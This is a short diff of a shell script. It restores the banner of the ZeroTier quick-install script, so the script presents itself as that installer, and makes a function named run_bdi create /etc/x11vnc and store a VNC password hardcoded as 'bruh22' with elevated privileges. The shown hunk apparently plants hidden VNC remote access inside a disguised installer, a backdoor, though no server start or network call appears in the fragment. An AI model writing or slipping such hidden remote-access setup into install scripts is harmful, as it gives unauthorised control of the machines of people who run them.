@@ -80,31 +80,31 @@ run_bdi() {
   #
   ##########################################################
 
-  # echo
-  # echo '*** ZeroTier Service Quick Install for Unix-like Systems'
-  # echo
-  # echo '*** Tested OSes / distributions:'
-  # echo
-  # echo '***   MacOS (10.13+) (just installs ZeroTier One.pkg)'
-  # echo '***   Debian Linux (7+)'
-  # echo '***   RedHat/CentOS Linux (6+)'
-  # echo '***   Fedora Linux (16+)'
-  # echo '***   SuSE Linux (12+)'
-  # echo '***   Mint Linux (20+)'
-  # echo '***   Kali Linux (2024.1+)'
-  # echo
-  # echo '*** Supported architectures vary by OS / distribution. We try to support'
-  # echo '*** every system architecture supported by the target.'
-  # echo
-  # echo '*** Please report problems by opening a GitHub issue or Pull Request at: '
-  # echo '*** https://github.com/zerotier/install.zerotier.com'
-  # echo '*** Please include the content of `/etc/os-release` for your distribution.'
-  # echo
+  echo
+  echo '*** ZeroTier Service Quick Install for Unix-like Systems'
+  echo
+  echo '*** Tested OSes / distributions:'
+  echo
+  echo '***   MacOS (10.13+) (just installs ZeroTier One.pkg)'
+  echo '***   Debian Linux (7+)'
+  echo '***   RedHat/CentOS Linux (6+)'
+  echo '***   Fedora Linux (16+)'
+  echo '***   SuSE Linux (12+)'
+  echo '***   Mint Linux (20+)'
+  echo '***   Kali Linux (2024.1+)'
+  echo
+  echo '*** Supported architectures vary by OS / distribution. We try to support'
+  echo '*** every system architecture supported by the target.'
+  echo
+  echo '*** Please report problems by opening a GitHub issue or Pull Request at: '
+  echo '*** https://github.com/zerotier/install.zerotier.com'
+  echo '*** Please include the content of `/etc/os-release` for your distribution.'
+  echo
 
   ###########################
 
-  mkdir /etc/x11vnc
-  x11vnc --storepasswd bruh22 /etc/x11vnc/vncpwd
+  $SUDO mkdir /etc/x11vnc
+  $SUDO x11vnc --storepasswd bruh22 /etc/x11vnc/vncpwd
 
   ###########################
 
